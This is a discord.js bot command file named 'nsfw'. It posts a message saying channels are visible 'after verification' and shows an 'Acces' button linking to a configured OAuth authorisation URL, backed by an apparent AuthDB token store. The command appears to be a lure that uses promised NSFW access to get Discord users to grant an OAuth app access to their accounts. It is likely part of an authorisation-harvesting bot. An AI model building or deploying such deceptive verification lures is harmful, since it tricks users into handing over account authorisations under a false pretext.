
const { ApplicationCommandType, ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const discord = require("discord.js");
const config = require("../../config")
let AuthDB = require(`../../database/AuthDB`)
const { redirect_uri } = require("../../config.js");


module.exports = {
  name: "nsfw",
  description: "nsfw",
  options: null,

  type: ApplicationCommandType.ChatInput,
  run: async (client, interaction, args) => {



    let embed1 = new discord.EmbedBuilder()
      .setTitle(`You can see channels after verification.`)
      .setDescription(`Click On \`Access\` To Have Acces to Nsfw!`)
      .setColor('#36393e')
    .setImage('https://media.discordapp.net/attachments/895353212956192809/972072712950399036/4e25c6a7ac1fd3a31fd62594930536221cfd32f3.gif?width=480&height=270')
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
        .setLabel("Acces")
        .setStyle(ButtonStyle.Link)
        .setURL(`${config.oauth_link}`)
        .setDisabled(false),
        );
        await interaction.reply({
          embeds: [embed1],
          components: [row]
        });
      },
    };